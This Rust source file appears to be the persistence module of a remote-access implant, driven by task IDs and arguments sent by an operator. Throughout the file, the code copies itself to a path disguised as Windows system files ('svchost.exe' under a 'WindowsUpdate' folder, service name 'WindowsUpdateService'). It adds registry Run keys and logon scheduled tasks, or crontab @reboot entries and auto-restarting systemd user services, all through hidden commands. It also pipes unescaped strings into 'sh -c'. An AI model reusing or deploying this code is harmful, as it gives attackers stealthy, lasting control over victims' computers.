/// Service manager: install/remove persistence for the agent binary.

use super::TaskResult;

pub fn install(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let install_path = args
        .get("path")
        .and_then(|v| v.as_str())
        .unwrap_or("");

    let name = args
        .get("name")
        .and_then(|v| v.as_str())
        .unwrap_or("WindowsUpdateService");

    #[cfg(target_os = "windows")]
    {
        install_windows(task_id, name, install_path)
    }
    #[cfg(not(target_os = "windows"))]
    {
        install_linux(task_id, name, install_path)
    }
}

pub fn remove(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let name = args
        .get("name")
        .and_then(|v| v.as_str())
        .unwrap_or("WindowsUpdateService");

    #[cfg(target_os = "windows")]
    {
        remove_windows(task_id, name)
    }
    #[cfg(not(target_os = "windows"))]
    {
        remove_linux(task_id, name)
    }
}

#[cfg(target_os = "windows")]
fn install_windows(task_id: i64, name: &str, install_path: &str) -> TaskResult {
    let current_exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => return TaskResult::error(task_id, format!("get current exe: {}", e)),
    };

    // Determine install location
    let target_path = if install_path.is_empty() {
        let appdata = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
        let dir = format!("{}\\Microsoft\\WindowsUpdate", appdata);
        let _ = std::fs::create_dir_all(&dir);
        format!("{}\\svchost.exe", dir)
    } else {
        install_path.to_string()
    };

    // Copy binary to persistent location
    if current_exe.to_string_lossy() != target_path {
        if let Err(e) = std::fs::copy(&current_exe, &target_path) {
            return TaskResult::error(task_id, format!("copy binary: {}", e));
        }
    }

    // Add to registry Run key (HKCU)
    let reg_result = crate::utils::helpers::hidden_command("reg")
        .args([
            "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            name,
            "/t",
            "REG_SZ",
            "/d",
            &target_path,
            "/f",
        ])
        .output();

    match reg_result {
        Ok(out) if out.status.success() => {}
        _ => {
            return TaskResult::error(task_id, "failed to add registry persistence".to_string());
        }
    }

    // Also create a scheduled task as backup persistence
    let _ = crate::utils::helpers::hidden_command("schtasks")
        .args([
            "/create",
            "/tn",
            name,
            "/tr",
            &target_path,
            "/sc",
            "ONLOGON",
            "/f",
        ])
        .output();

    TaskResult::success(
        task_id,
        format!(
            "installed: binary at {}, registry Run + scheduled task '{}'",
            target_path, name
        ),
    )
}

#[cfg(target_os = "windows")]
fn remove_windows(task_id: i64, name: &str) -> TaskResult {
    let mut results = Vec::new();

    // Remove registry entry
    let reg_result = crate::utils::helpers::hidden_command("reg")
        .args([
            "delete",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            name,
            "/f",
        ])
        .output();
    match reg_result {
        Ok(out) if out.status.success() => results.push("registry entry removed".to_string()),
        _ => results.push("registry entry not found or removal failed".to_string()),
    }

    // Remove scheduled task
    let schtask_result = crate::utils::helpers::hidden_command("schtasks")
        .args(["/delete", "/tn", name, "/f"])
        .output();
    match schtask_result {
        Ok(out) if out.status.success() => results.push("scheduled task removed".to_string()),
        _ => results.push("scheduled task not found or removal failed".to_string()),
    }

    TaskResult::success(task_id, results.join("; "))
}

#[cfg(not(target_os = "windows"))]
fn install_linux(task_id: i64, name: &str, install_path: &str) -> TaskResult {
    let current_exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => return TaskResult::error(task_id, format!("get current exe: {}", e)),
    };

    let target_path = if install_path.is_empty() {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        let dir = format!("{}/.local/share/{}", home, name);
        let _ = std::fs::create_dir_all(&dir);
        format!("{}/{}", dir, name)
    } else {
        install_path.to_string()
    };

    // Copy binary
    if current_exe.to_string_lossy() != target_path {
        if let Err(e) = std::fs::copy(&current_exe, &target_path) {
            return TaskResult::error(task_id, format!("copy binary: {}", e));
        }
        // Make executable
        let _ = crate::utils::helpers::hidden_command("chmod")
            .args(["+x", &target_path])
            .output();
    }

    // Add crontab entry for persistence
    let existing = crate::utils::helpers::hidden_command("crontab")
        .args(["-l"])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();

    if !existing.contains(&target_path) {
        let cron_entry = format!("@reboot {}", target_path);
        let new_crontab = format!("{}\n{}\n", existing.trim(), cron_entry);
        let _ = crate::utils::helpers::hidden_command("sh")
            .args(["-c", &format!("echo '{}' | crontab -", new_crontab)])
            .output();
    }

    // Create systemd user service
    let home = std::env::var("HOME").unwrap_or_default();
    let service_dir = format!("{}/.config/systemd/user", home);
    let _ = std::fs::create_dir_all(&service_dir);
    let service_content = format!(
        "[Unit]\nDescription={name}\n\n[Service]\nExecStart={path}\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
        name = name,
        path = target_path,
    );
    let service_path = format!("{}/{}.service", service_dir, name);
    let _ = std::fs::write(&service_path, service_content);
    let _ = crate::utils::helpers::hidden_command("systemctl")
        .args(["--user", "enable", name])
        .output();
    let _ = crate::utils::helpers::hidden_command("systemctl")
        .args(["--user", "start", name])
        .output();

    TaskResult::success(
        task_id,
        format!(
            "installed: binary at {}, crontab @reboot + systemd user service",
            target_path
        ),
    )
}

#[cfg(not(target_os = "windows"))]
fn remove_linux(task_id: i64, name: &str) -> TaskResult {
    let mut results = Vec::new();

    // Remove crontab entries
    let existing = crate::utils::helpers::hidden_command("crontab")
        .args(["-l"])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    let filtered: Vec<&str> = existing.lines().filter(|l| !l.contains(name)).collect();
    let _ = crate::utils::helpers::hidden_command("sh")
        .args(["-c", &format!("echo '{}' | crontab -", filtered.join("\n"))])
        .output();
    results.push("crontab entries removed".to_string());

    // Stop and disable systemd service
    let _ = crate::utils::helpers::hidden_command("systemctl")
        .args(["--user", "stop", name])
        .output();
    let _ = crate::utils::helpers::hidden_command("systemctl")
        .args(["--user", "disable", name])
        .output();

    let home = std::env::var("HOME").unwrap_or_default();
    let service_path = format!("{}/.config/systemd/user/{}.service", home, name);
    let _ = std::fs::remove_file(&service_path);
    results.push("systemd service removed".to_string());

    TaskResult::success(task_id, results.join("; "))
}
